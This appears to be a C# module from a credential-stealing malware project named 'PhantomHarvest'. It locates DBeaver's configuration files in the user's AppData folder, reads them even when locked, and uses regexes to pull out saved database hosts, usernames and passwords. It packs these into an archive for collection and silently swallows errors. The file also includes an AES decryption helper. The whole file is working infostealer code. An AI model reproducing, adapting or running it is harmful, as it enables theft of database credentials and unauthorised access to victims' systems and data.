using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Tools
{
	internal class DBeaver
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string appData = DBeaver.GetAppDataFolderPath();
				string workspace = Path.Combine(appData, "DBeaverData\\workspace6\\General");
				string dataSourcePath = Path.Combine(workspace, ".dbeaver\\data-sources.json");
				string credPath = Path.Combine(workspace, ".dbeaver\\credentials-config.json");
				
				if (File.Exists(dataSourcePath) && File.Exists(credPath))
				{
					string sources = "";
					string config = "";
					
					try
					{
						byte[] sourceBytes = LockedFile.ReadLockedFile(dataSourcePath);
						sources = sourceBytes != null ? Encoding.UTF8.GetString(sourceBytes) : File.ReadAllText(dataSourcePath);
						
						byte[] configBytes = LockedFile.ReadLockedFile(credPath);
						config = configBytes != null ? Encoding.UTF8.GetString(configBytes) : File.ReadAllText(credPath);
					}
					catch {}
					
					if (!string.IsNullOrEmpty(sources) && !string.IsNullOrEmpty(config))
					{
						string info = DBeaver.ConnectionInfo(config, sources);
						if (!string.IsNullOrEmpty(info))
						{
							using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(info)))
							{
								zip.AddStream(ArchiveManager.Compression.Deflate, DBeaver.ToolName + "/DBeaver.txt", ms, DateTime.Now, "");
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		public static string ConnectionInfo(string config, string sources)
		{
			StringBuilder stringBuilder = new StringBuilder();
			string pattern = "\\\"(?<key>[^\"]+)\\\"\\s*:\\s*\\{\\s*\\\"#connection\\\"\\s*:\\s*\\{\\s*\\\"user\\\"\\s*:\\s*\\\"(?<user>[^\"]+)\\\"\\s*,\\s*\\\"password\\\"\\s*:\\s*\\\"(?<password>[^\"]+)\\\"\\s*\\}\\s*\\}";
			foreach (object obj in Regex.Matches(config, pattern))
			{
				Match match = (Match)obj;
				string value = match.Groups["key"].Value;
				string value2 = match.Groups["user"].Value;
				string value3 = match.Groups["password"].Value;
				stringBuilder.AppendLine(DBeaver.MatchDataSource(sources, value));
				stringBuilder.AppendLine("username: " + value2);
				stringBuilder.AppendLine("password: " + value3);
				stringBuilder.AppendLine();
			}
			return stringBuilder.ToString();
		}

		public static string MatchDataSource(string json, string jdbcKey)
		{
			string pattern = "\"(" + Regex.Escape(jdbcKey) + ")\":\\s*{[^}]+?\"url\":\\s*\"([^\"]+)\"[^}]+?}";
			Match match = Regex.Match(json, pattern);
			if (match.Success)
			{
				string value = match.Groups[2].Value;
				return "host: " + value;
			}
			return "";
		}

		public static string GetAppDataFolderPath()
		{
			return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		}

		public static string Decrypt(byte[] buffer, string keyHex, string ivHex)
		{
			byte[] key = DBeaver.StringToByteArray(keyHex);
			byte[] iv = DBeaver.StringToByteArray(ivHex);
			string result;
			using (Aes aes = Aes.Create())
			{
				aes.Key = key;
				aes.IV = iv;
				aes.Mode = CipherMode.CBC;
				aes.Padding = PaddingMode.PKCS7;
				using (MemoryStream memoryStream = new MemoryStream(buffer))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader(cryptoStream, Encoding.UTF8))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}

		private static byte[] StringToByteArray(string hex)
		{
			int length = hex.Length;
			byte[] array = new byte[length / 2];
			for (int i = 0; i < length; i += 2)
			{
				array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
			}
			return array;
		}

		public static string ToolName = "DBeaver";
	}
}
